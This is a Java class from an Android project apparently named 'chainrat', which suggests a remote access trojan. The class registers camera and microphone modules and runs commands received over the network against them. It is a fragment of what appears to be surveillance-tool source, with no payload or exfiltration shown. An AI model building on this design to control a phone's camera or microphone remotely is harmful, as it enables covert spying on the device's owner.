package com.nefi.chainrat;

import android.util.Log;
import com.nefi.chainrat.modules.CameraModule;
import com.nefi.chainrat.modules.MicrophoneControl;
import com.nefi.chainrat.networking.Command;

import java.util.ArrayList;
import java.util.List;

public class CommandManager {

    private final static String TAG = "CM";
    private final static String PACKAGE = "com";
    //private List<Class> myModuleClasses;
    private List <IModule> myModules = new ArrayList<>();

    public CommandManager(){
        Log.d(TAG, "Starting CommandManager for loop...");


        //My modules
        Log.d(TAG, "Adding modules...");
        CameraModule cameraCommand = new CameraModule();
        MicrophoneControl microphoneControl = new MicrophoneControl();

        //Add to list
        myModules.add(cameraCommand);
        myModules.add(microphoneControl);

        Log.d(TAG, "done! Size: " + myModules.size());
    }

    public boolean executeCommand(Command command){
        for(IModule m : myModules){
            if(m.handlerType() == command.getType()){
                m.execute(command);
            }
        }
        return false;
    }
}

